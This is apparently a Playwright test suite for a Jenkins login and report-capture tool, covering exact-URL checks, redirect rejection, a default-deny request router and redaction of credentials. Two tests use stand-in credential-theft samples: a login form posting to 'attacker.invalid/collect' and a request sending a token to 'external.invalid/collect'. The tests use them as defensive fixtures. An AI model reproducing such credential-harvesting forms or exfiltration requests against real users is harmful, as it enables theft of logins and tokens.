import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

import type { AddressInfo } from 'node:net';

import { expect, test, type BrowserContext, type Page, type Route } from '@playwright/test';

import { normalizeProjectConfigDocument } from '../../src/config.js';
import { formatJenkinsFailure } from '../../src/jenkins/errors.js';
import { openJenkinsJob, submitJenkinsLogin } from '../../src/jenkins/auth.js';
import { jenkinsJobPathSegments } from '../../src/jenkins/url-identity.js';
import {
  DEFAULT_JENKINS_RUNNER_SELECTORS,
  type JenkinsRunnerConfig,
} from '../../src/jenkins/runner-config.js';
import { executeJenkinsWorkflow } from '../../src/project/project-workflow.js';
import { ProjectRunState } from '../../src/project/project-run-state.js';
import { WorkflowDeadline } from '../../src/workflow/workflow-deadline.js';
import { defaultCapture } from '../../src/project/project-capture.js';
import { pageLinkCandidatesWithStatus } from '../../src/reports/snyk/snyk-capture-support.js';
import {
  installTemplateReportRoutes,
  loadTemplateReportFixture,
  MAX_TEMPLATE_TOTAL_BYTES,
  templateResponse,
  type TemplateReportFixture,
  type TemplateRouteRecorder,
} from '../../src/templates/template-report-fixture.js';
import { runFromTemplates } from '../../src/templates/template-report-runner.js';


function config(baseUrl = 'https://jenkins.example/jenkins'): JenkinsRunnerConfig {
  return {
    baseUrl,
    loginUrl: `${baseUrl}/login`,
    jobUrl: `${baseUrl}/job/service-a/`,
    username: 'user',
    password: 'password',
    timeoutMs: 1_000,
    browser: 'chromium',
    selectors: DEFAULT_JENKINS_RUNNER_SELECTORS,
  };
}

function projectDocument(baseUrl: string) {
  const origin = new URL(baseUrl).origin;
  return {
    schemaVersion: 1 as const,
    projects: [{
      id: 'service-a',
      name: 'Service A',
      enabled: true,
      loginUrl: `${baseUrl}/login`,
      jobUrl: `${baseUrl}/job/service-a/`,
      timeoutMs: 2_000,
      browser: 'chromium' as const,
      artifactDir: 'reports',
      credentials: { usernameVariable: 'JENKINS_USER', passwordVariable: 'JENKINS_PASSWORD' },
      sourceOrigins: { jenkins: [origin], snyk: [origin], sonarqube: [origin] },
      snyk: { allowedOrigins: [origin], projectId: 'service-a' },
      sonarqube: { allowedOrigins: [origin], projectId: 'service-a' },
    }],
  };
}

async function listen(handler: (request: IncomingMessage, response: ServerResponse) => void): Promise<{ server: Server; baseUrl: string }> {
  const server = createServer(handler);
  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', resolve);
  });
  const address = server.address() as AddressInfo;
  return { server, baseUrl: `http://127.0.0.1:${address.port}/jenkins` };
}

async function close(server: Server): Promise<void> {
  await new Promise<void>((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
}
interface FakeTemplateRoute {
  readonly route: Route;
  readonly state: { aborted?: string; fulfilled?: unknown };
}

function fakeTemplateRoute(method: string, url: string): FakeTemplateRoute {
  const state: FakeTemplateRoute['state'] = {};
  const request = { method: () => method, url: () => url };
  const route = {
    request: () => request,
    abort: async (errorCode?: string) => { state.aborted = errorCode ?? 'default'; },
    fulfill: async (response: unknown) => { state.fulfilled = response; },
  } as unknown as Route;
  return { route, state };
}

async function captureTemplateRouteHandler(fixture: TemplateReportFixture): Promise<{
  handler: (route: Route) => Promise<void>;
  recorder: TemplateRouteRecorder;
}> {
  let handler: ((route: Route) => Promise<void>) | undefined;
  const context = {
    route: async (_pattern: string, callback: unknown): Promise<void> => {
      handler = callback as (route: Route) => Promise<void>;
    },
  } as unknown as BrowserContext;
  const recorder = await installTemplateReportRoutes(context, fixture);
  if (handler === undefined) throw new Error('template route handler was not installed');
  return { handler, recorder };
}

test('submits login and opens the exact configured job in one context', async ({ page }) => {
  let submittedCredentials: string | undefined;
  const { server, baseUrl } = await listen((request, response) => {
    const requestUrl = new URL(request.url ?? '/', `http://${request.headers.host ?? '127.0.0.1'}`);
    if (request.method === 'GET' && requestUrl.pathname === '/jenkins/login') {
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end('<form method="post" action="/jenkins/j_spring_security_check"><label>Username<input name="j_username"></label><label>Password<input name="j_password" type="password"></label><button>Sign in</button></form>');
      return;
    }
    if (request.method === 'POST' && requestUrl.pathname === '/jenkins/j_spring_security_check') {
      const chunks: Buffer[] = [];
      request.on('data', (chunk: Buffer) => chunks.push(chunk));
      request.once('end', () => {
        const form = new URLSearchParams(Buffer.concat(chunks).toString('utf8'));
        submittedCredentials = `${form.get('j_username') ?? ''}:${form.get('j_password') ?? ''}`;
        response.writeHead(302, { 'set-cookie': 'JSESSIONID=fixture; Path=/jenkins', location: '/jenkins/home/' });
        response.end();
      });
      return;
    }
    if (request.method === 'GET' && requestUrl.pathname === '/jenkins/home/') {
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end('<body id="jenkins"><h1>Signed in</h1><a href="/jenkins/manage">Manage Jenkins</a></body>');
      return;
    }
    if (request.method === 'GET' && requestUrl.pathname === '/jenkins/job/service-a/') {
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end('<body id="jenkins"><h1>service-a</h1><a href="/jenkins/job/service-a/artifact/snyk-results.html">Snyk test report</a><a href="/jenkins/job/service-a/artifact/snyk-sca-results-summary.json">Snyk summary JSON</a><a href="https://sonarqube.example/dashboard?id=service-a">SonarQube Quality Gate</a></body>');
      return;
    }
    response.writeHead(404);
    response.end('not found');
  });
  try {
    const runnerConfig = { ...config(baseUrl), username: 'any-user', password: 'any-password' };
    await submitJenkinsLogin(page, runnerConfig, new WorkflowDeadline(1_000));
    expect(page.url()).toBe(`${baseUrl}/home/`);
    await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(1_000))).resolves.toBe(`${baseUrl}/job/service-a/`);
    expect(submittedCredentials).toBe('any-user:any-password');
  } finally {
    await close(server);
  }
});

test('rejects an external login form action before filling credentials', async ({ page }) => {
  let credentialsSubmitted = false;
  const runnerConfig = config();
  await page.route(runnerConfig.loginUrl, (route) => route.fulfill({
    status: 200,
    contentType: 'text/html',
    body: '<form method="post" action="https://attacker.invalid/collect"><label>Username<input name="j_username"></label><label>Password<input name="j_password" type="password"></label><button>Sign in</button></form>',
  }));
  await page.route('https://attacker.invalid/**', async (route) => {
    credentialsSubmitted = true;
    await route.abort();
  });
  await expect(submitJenkinsLogin(page, runnerConfig, new WorkflowDeadline(500)))
    .rejects.toThrow(/form action/iu);
  expect(credentialsSubmitted).toBe(false);
});
test('rejects an alternate same-base sign-in redirect as unauthenticated', async ({ page }) => {
  const runnerConfig = config();
  await page.route('**/*', async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    if (request.method() === 'GET' && url.href === runnerConfig.loginUrl) {
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<form method="post" action="/jenkins/j_spring_security_check"><label>Username<input name="j_username"></label><label>Password<input name="j_password" type="password"></label><button>Sign in</button></form>',
      });
      return;
    }
    if (request.method() === 'POST' && url.pathname === '/jenkins/j_spring_security_check') {
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<!doctype html><meta http-equiv="refresh" content="0;url=/jenkins/signin"><a href="/jenkins/signin">Continue</a>',
      });
      return;
    }
    if (request.method() === 'GET' && url.pathname === '/jenkins/signin') {
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<form method="post" action="/jenkins/j_spring_security_check"><label>Username<input name="j_username"></label><label>Password<input name="j_password" type="password"></label><button>Sign in</button></form>',
      });
      return;
    }
    await route.abort();
  });
  await expect(submitJenkinsLogin(page, runnerConfig, new WorkflowDeadline(2_000)))
    .rejects.toThrow(/login failed/u);
});
test('rejects an alternate same-base security redirect with a misleading landmark', async ({ page }) => {
  const runnerConfig = config();
  await page.route('**/*', async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    if (request.method() === 'GET' && url.href === runnerConfig.loginUrl) {
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<form method="post" action="/jenkins/j_spring_security_check"><label>Username<input name="j_username"></label><label>Password><input name="j_password" type="password"></label><button>Sign in</button></form>',
      });
      return;
    }
    if (request.method() === 'POST' && url.pathname === '/jenkins/j_spring_security_check') {
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<!doctype html><meta http-equiv="refresh" content="0;url=/jenkins/security%52ealm/"><a href="/jenkins/security%52ealm/">Continue</a>',
      });
      return;
    }
    if (request.method() === 'GET' && /\/jenkins\/security(?:%52|r)realm\//iu.test(url.pathname)) {
      await route.fulfill({
        status: 200,
        contentType: 'text/html',
        body: '<body id="jenkins"><h1>Security realm</h1><a>Manage Jenkins</a></body>',
      });
      return;
    }
    await route.abort();
  });
  await expect(submitJenkinsLogin(page, runnerConfig, new WorkflowDeadline(500)))
    .rejects.toThrow(/login failed/u);
});




test('fails closed when login or job navigation changes the configured URL', async ({ page }) => {
  const runnerConfig = config();
  await page.route(runnerConfig.loginUrl, (route) => route.fulfill({ status: 200, headers: { location: '/jenkins/other-login' }, body: '<label>Username</label>' }));
  await expect(submitJenkinsLogin(page, runnerConfig, new WorkflowDeadline(500))).rejects.toThrow(/login failed/u);

  await page.unrouteAll();
  await page.route(runnerConfig.jobUrl, (route) => route.fulfill({ status: 302, headers: { location: '/jenkins/job/other/' }, body: '' }));
  await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(500))).rejects.toThrow(/job navigation failed/u);
});

test('rejects HTTP errors from exact login and job destinations', async ({ page }) => {
  const runnerConfig = config();
  await page.route(runnerConfig.loginUrl, (route) => route.fulfill({ status: 404, body: '<label>Username</label>' }));
  await expect(submitJenkinsLogin(page, runnerConfig, new WorkflowDeadline(500))).rejects.toThrow(/login failed/u);

  await page.unrouteAll();
  await page.route(runnerConfig.jobUrl, (route) => route.fulfill({ status: 403, body: '<body id="jenkins"><h1>service-a</h1></body>' }));
  await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(500))).rejects.toThrow(/job navigation failed/u);
});

test('accepts the exact job heading or the Jenkins body landmark, never a similar heading', async ({ page }) => {
  const runnerConfig = config();
  await page.route(runnerConfig.jobUrl, (route) => route.fulfill({ body: '<h1>service-a-old</h1>' }));
  await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(500))).rejects.toThrow(/job navigation failed/u);

  await page.unrouteAll();
  await page.route(runnerConfig.jobUrl, (route) => route.fulfill({ body: '<body id="jenkins"><h1>service-a-old</h1></body>' }));
  await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(500))).resolves.toBe(runnerConfig.jobUrl);
});
test('extracts nested Jenkins job segments and repeatedly decodes values', () => {
  const canonicalUrl = 'https://jenkins.example/job/Container%20Platform/job/ID/job/job-id/job/Service%20Name/job/Build/job/Build%20ID%20Service%20Name/job/release%252Fsit/';
  expect(jenkinsJobPathSegments(canonicalUrl)).toEqual([
    'Container Platform',
    'ID',
    'job-id',
    'Service Name',
    'Build',
    'Build ID Service Name',
    'release/sit',
  ]);
  expect(jenkinsJobPathSegments('https://jenkins.example/job/folder/job/job/job/job-id/job/release%252Fsit/')).toEqual([
    'folder',
    'job',
    'job-id',
    'release/sit',
  ]);
});
test('retains exact Jenkins heading checks for simple job paths', async ({ page }) => {
  const runnerConfig = { ...config(), jobUrl: 'https://jenkins.example/jenkins/service-a' };
  await page.route(runnerConfig.jobUrl, (route) => route.fulfill({ body: '<h1>service-a</h1>' }));
  await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(500))).resolves.toBe(runnerConfig.jobUrl);
});
test('does not treat incomplete Jenkins job markers as exact headings', async ({ page }) => {
  const runnerConfig = { ...config(), jobUrl: 'https://jenkins.example/jenkins/job' };
  await page.route(runnerConfig.jobUrl, (route) => route.fulfill({ body: '<h1>job</h1>' }));
  await expect(openJenkinsJob(page, runnerConfig, new WorkflowDeadline(500))).rejects.toThrow(/job navigation failed/u);
});

test('returns direct job identity and direct run phases without a trigger or build', async ({ page }) => {
  const server = await listen((request, response) => {
    const requestUrl = new URL(request.url ?? '/', `http://${request.headers.host ?? '127.0.0.1'}`);
    if (requestUrl.pathname === '/jenkins/login') {
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end('<form method="post" action="/jenkins/j_spring_security_check"><label>Username<input name="j_username"></label><label>Password<input name="j_password" type="password"></label><button>Sign in</button></form>');
      return;
    }
    if (requestUrl.pathname === '/jenkins/j_spring_security_check') {
      response.writeHead(302, { location: '/jenkins/home/' });
      response.end();
      return;
    }
    if (requestUrl.pathname === '/jenkins/home/') {
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end('<body id="jenkins"><h1>Signed in</h1><a href="/jenkins/manage">Manage Jenkins</a></body>');
      return;
    }
    if (requestUrl.pathname === '/jenkins/job/service-a/') {
      response.writeHead(200, { 'content-type': 'text/html' });
      response.end('<body id="jenkins"><h1>service-a</h1></body>');
      return;
    }
    response.writeHead(404);
    response.end('not found');
  });
  try {
    const [project] = normalizeProjectConfigDocument(projectDocument(server.baseUrl), { JENKINS_USER: 'user', JENKINS_PASSWORD: 'password' });
    if (project === undefined) throw new Error('test project was not normalized');
    const state = new ProjectRunState({ projectId: project.id, projectName: project.name, jobUrl: project.jobUrl, runId: 'run-20260831', runDirectory: 'reports/service-a/run-20260831' });
    const result = await executeJenkinsWorkflow(page, project, { username: 'user', password: 'password' }, new WorkflowDeadline(project.timeoutMs), state);
    expect(result).toMatchObject({ jobUrl: project.jobUrl, diagnostics: { observationErrors: [] } });
    expect(result).not.toHaveProperty('terminal');
    expect(result).not.toHaveProperty('trigger');
    expect(state.phase).toBe('job_opened');
  } finally {
    await close(server.server);
  }
});

test('fails closed when bounded link discovery truncates competing publisher candidates', async ({ page }) => {
  const [project] = normalizeProjectConfigDocument(projectDocument('https://jenkins.example/jenkins'), {
    JENKINS_USER: 'user',
    JENKINS_PASSWORD: 'password',
  });
  if (project === undefined) throw new Error('test project was not normalized');
  const origin = new URL(project.jobUrl).origin;
  const leadingLinks = Array.from(
    { length: 256 },
    (_, index) => `<a href="${origin}/ignored/${index}">ignored</a>`,
  ).join('');
  await page.setContent(`${leadingLinks}
    <a href="${origin}/job/service-a/artifact/snyk-results.html">Snyk test report</a>
    <a href="${origin}/job/service-a/artifact/snyk-results-copy.html">Snyk test report copy</a>
    <a href="${origin}/dashboard?id=service-a">SonarQube Quality Gate</a>`);
  const collection = await pageLinkCandidatesWithStatus(page);
  expect(collection.truncated).toBe(true);
  expect(collection.candidates.some((candidate) => candidate.href.endsWith('/snyk-results.html'))).toBe(false);

  const outputDirectory = fs.mkdtempSync(path.join(os.tmpdir(), 'phase-02-link-limit-'));
  try {
    const state = new ProjectRunState({
      projectId: project.id,
      projectName: project.name,
      jobUrl: project.jobUrl,
      runId: 'run-20260831-link-limit',
      runDirectory: outputDirectory,
    });
    state.transition('authenticated');
    state.transition('job_opened');
    const capture = await defaultCapture({
      page,
      project,
      workflow: {
        jobUrl: project.jobUrl,
        observedAt: '2026-08-31T00:00:00.000Z',
        diagnostics: { observationErrors: [] },
      },
      deadline: new WorkflowDeadline(30_000),
      state,
      outputDirectory,
    });
    expect(capture.reports.snyk.state).toBe('incomplete');
    expect(capture.reports.sonarqube.state).toBe('incomplete');
    expect(capture.warnings.some((warning) => warning.includes('bounded link limit'))).toBe(true);
  } finally {
    fs.rmSync(outputDirectory, { recursive: true, force: true });
  }
});

test('routes checked-in templates through the production direct workflow', async () => {
  test.setTimeout(60_000);
  const reportRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'phase-02-template-route-'));
  const env = {
    PROJECT_ID: 'phase-02-template-route',
    PROJECT_NAME: 'Phase 02 Template Route',
    ARTIFACT_DIR: reportRoot,
    PLAYWRIGHT_BROWSER: 'chromium',
    TEMPLATE_TIMEOUT_MS: '30000',
  };
  const fixture = await loadTemplateReportFixture(env);
  const requests: Array<{ method: string; url: string }> = [];
  try {
    const result = await runFromTemplates(env, {
      configureContext: async (context) => {
        context.on('request', (request) => {
          if (request.resourceType() === 'document') {
            requests.push({ method: request.method(), url: request.url() });
          }
        });
      },
    });
    const outcome = result.outcomes[0];
    expect(result.exitCode, outcome?.warnings.join(' | ')).toBe(0);
    expect(outcome?.state, outcome?.warnings.join(' | ')).toBe('success');
    const reportDirectory = outcome?.reportDirectory;
    if (reportDirectory === undefined) throw new Error('template report directory was not created');
    const data = JSON.parse(fs.readFileSync(path.join(reportDirectory, 'data.json'), 'utf8')) as {
      jenkins: { jobUrl: string };
      navigation: Record<string, { state: string }>;
    };
    expect(data.jenkins.jobUrl).toBe(fixture.jobUrl);
    expect(Object.keys(data.navigation).sort()).toEqual([
      'jenkins-job',
      'snyk-report',
      'sonarqube-home',
      'sonarqube-issues',
      'sonarqube-overall',
    ]);

    const expectedRequests = [
      `GET ${fixture.loginUrl}`,
      `POST ${fixture.loginActionUrl}`,
      `GET ${fixture.jobUrl}`,
      `GET ${fixture.jobUrl}`,
      `GET ${fixture.snykReportUrl}`,
      `GET ${fixture.snykSummaryUrl}`,
      `GET ${fixture.jobUrl}`,
      `GET ${fixture.sonarqubeHomeUrl}`,
      `GET ${fixture.sonarqubeHomeUrl}`,
      `GET ${fixture.sonarqubeOverallUrl}`,
      `GET ${fixture.sonarqubeIssuesUrl}`,
    ];
    expect(requests.map((request) => `${request.method} ${request.url}`)).toEqual(expectedRequests);
    expect(requests.some((request) => {
      const pathAfterJob = request.url.startsWith(fixture.jobUrl) ? request.url.slice(fixture.jobUrl.length) : request.url;
      return /(?:queue|build|trigger|api\/json|lastBuild)/iu.test(pathAfterJob);
    })).toBe(false);
  } finally {
    fs.rmSync(reportRoot, { recursive: true, force: true });
  }
});
test('aborts unknown same-origin template routes and records sanitized misses', async ({ page }) => {
  const fixture = await loadTemplateReportFixture({});
  const recorder = await installTemplateReportRoutes(page.context(), fixture);
  const unknownUrl = `${fixture.sonarqubeHomeUrl}&unexpected=1`;
  expect(templateResponse(new URL(unknownUrl), fixture)).toBeUndefined();
  await expect(page.goto(unknownUrl)).rejects.toThrow(/blocked|failed|aborted/iu);
  const expectedUrl = new URL(fixture.sonarqubeHomeUrl);
  expect(recorder.misses).toContainEqual({
    method: 'GET',
    origin: expectedUrl.origin,
    pathname: expectedUrl.pathname,
  });
  expect(recorder.truncated).toBe(false);
  expect(recorder.misses.every(({ origin, pathname }) =>
    !origin.includes('unexpected=1') && !pathname.includes('?'))).toBe(true);
});
test('default-deny template router records only sanitized unmatched requests', async () => {
  const fixture = await loadTemplateReportFixture({});
  const { handler, recorder } = await captureTemplateRouteHandler(fixture);
  const fixtureOrigin = new URL(fixture.jobUrl).origin;
  const validRoute = fakeTemplateRoute('GET', fixture.loginUrl);
  await handler(validRoute.route);
  expect(validRoute.state.fulfilled).toBeDefined();
  expect(recorder.misses).toEqual([]);

  const malformedRoute = fakeTemplateRoute('GET', 'not a valid URL?token=secret');
  await handler(malformedRoute.route);
  expect(malformedRoute.state.aborted).toBe('default');

  const externalRoute = fakeTemplateRoute('GET', 'https://external.invalid/collect?token=secret');
  await handler(externalRoute.route);
  expect(externalRoute.state.aborted).toBe('default');

  const wrongMethodRoute = fakeTemplateRoute('POST', `${fixtureOrigin}/unmapped?token=secret`);
  await handler(wrongMethodRoute.route);
  expect(wrongMethodRoute.state.aborted).toBe('blockedbyclient');

  const unmappedRoute = fakeTemplateRoute('GET', `${fixtureOrigin}/unmapped?token=secret`);
  await handler(unmappedRoute.route);
  expect(unmappedRoute.state.aborted).toBe('blockedbyclient');

  expect(recorder.misses).toContainEqual({ method: 'GET', origin: '[invalid]', pathname: '[invalid]' });
  expect(recorder.misses).toContainEqual({ method: 'GET', origin: 'https://external.invalid', pathname: '/collect' });
  expect(recorder.misses).toContainEqual({ method: 'POST', origin: fixtureOrigin, pathname: '/unmapped' });
  expect(recorder.misses).toContainEqual({ method: 'GET', origin: fixtureOrigin, pathname: '/unmapped' });
  expect(recorder.misses.every(({ origin, pathname }) =>
    !origin.includes('token=secret') && !pathname.includes('?'))).toBe(true);
  expect(recorder.truncated).toBe(false);
});
test('rejects a template corpus that exceeds the cumulative byte budget', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'phase-02-template-total-budget-'));
  const templateRoot = path.join(root, 'templates');
  try {
    fs.cpSync(path.resolve('templates'), templateRoot, { recursive: true });
    const oversizedFiles = [
      'jenkins-template/template.html',
      'jenkins-template/login.html',
      'snyk-template/template.html',
      'snyk-template/snyk-sca-results-summary.json',
      'sonarqube-template/template-home.html',
    ];
    const targetBytes = Math.ceil(MAX_TEMPLATE_TOTAL_BYTES / oversizedFiles.length) + 1;
    for (const relativePath of oversizedFiles) {
      const filename = path.join(templateRoot, relativePath);
      const original = fs.readFileSync(filename);
      fs.writeFileSync(filename, Buffer.concat([original, Buffer.alloc(Math.max(0, targetBytes - original.byteLength), 0x20)]));
    }
    await expect(loadTemplateReportFixture({ TEMPLATES_DIR: templateRoot })).rejects.toThrow(/total fixture budget/iu);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
test('rejects drifted saved login and publisher routes before installing them', async () => {
  const roots: string[] = [];
  const copyTemplates = (suffix: string): string => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), `phase-02-template-drift-${suffix}-`));
    fs.cpSync(path.resolve('templates'), path.join(root, 'templates'), { recursive: true });
    roots.push(root);
    return path.join(root, 'templates');
  };
  try {
    const loginRoot = copyTemplates('login');
    const loginFile = path.join(loginRoot, 'jenkins-template', 'login.html');
    const loginHtml = fs.readFileSync(loginFile, 'utf8');
    fs.writeFileSync(loginFile, loginHtml.replace(
      'https://jenkins-jenkins-example.example-domain.com/j_spring_security_check',
      'https://unexpected.invalid/j_spring_security_check',
    ));
    await expect(loadTemplateReportFixture({ TEMPLATES_DIR: loginRoot })).rejects.toThrow(/origin|unsafe/iu);

    const publisherRoot = copyTemplates('publisher');
    const publisherFile = path.join(publisherRoot, 'jenkins-template', 'template.html');
    const publisherHtml = fs.readFileSync(publisherFile, 'utf8');
    fs.writeFileSync(publisherFile, publisherHtml.replaceAll('snyk-results.html', 'snyk-results-drift.html'));
    await expect(loadTemplateReportFixture({ TEMPLATES_DIR: publisherRoot })).rejects.toThrow(/Snyk report/iu);
  } finally {
    for (const root of roots) fs.rmSync(root, { recursive: true, force: true });
  }
});


test('redacts credentials from Jenkins diagnostics', async ({ page }) => {
  const runnerConfig = config();
  await page.route('https://jenkins.example/jenkins/password/', (route) => route.fulfill({ body: '<h1>failure</h1>' }));
  await page.goto('https://jenkins.example/jenkins/password/');
  const message = formatJenkinsFailure('Jenkins failure', new Error('request failed'), runnerConfig, page);
  expect(message).not.toContain('password');
  expect(message).toContain('[REDACTED]');
});
